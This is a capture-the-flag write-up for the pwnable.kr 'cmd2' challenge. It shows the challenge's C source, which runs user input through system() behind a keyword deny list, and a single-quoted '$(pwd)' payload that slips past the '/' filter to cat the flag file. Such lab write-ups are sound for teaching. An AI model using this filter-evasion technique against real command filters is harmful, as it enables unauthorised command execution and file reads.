# pwnable.kr -- Toddler's Bottle -- cmd2

## 1. Challenge

```
Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission...
but I wanna play anytime I want!

ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)
```

## 2. Solution

Connect target and see the source code. But this time, you'd pay attention to the login password. The password is the flag of `cmd1` challenge. I will never tell flags in this repository, so you'd better to solve `cmd1` challenge first. Here is the source code of cmd2:

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
    int r=0;
    r += strstr(cmd, "=")!=0;
    r += strstr(cmd, "PATH")!=0;
    r += strstr(cmd, "export")!=0;
    r += strstr(cmd, "/")!=0;
    r += strstr(cmd, "`")!=0;
    r += strstr(cmd, "flag")!=0;
    return r;
}

extern char** environ;
void delete_env(){
    char** p;
    for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
    delete_env();
    putenv("PATH=/no_command_execution_until_you_become_a_hacker");
    if(filter(argv[1])) return 0;
    printf("%s\n", argv[1]);
    system( argv[1] );
    return 0;
}
```

You can find there are more substrings or characters filtered including the most important `"/"`. But there's still one way to make character `"/"` shown in `system(argv[1])`.

If we go back to `"/"` directory and type:

```bash
$ echo $(pwd)
```

you can get a `"/"` character. So that means `"$(pwd)"` is escaped to `"/"`. However if you directly pass it to program `cmd2`, it still will be filtered. So we must insure that `"$(pwd)"` shall not be escaped while passing arguments.

One of solutions is to use a pair of single quote marks wrapping argument like this:

```bash
$ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*'
```

then you will see the flag.
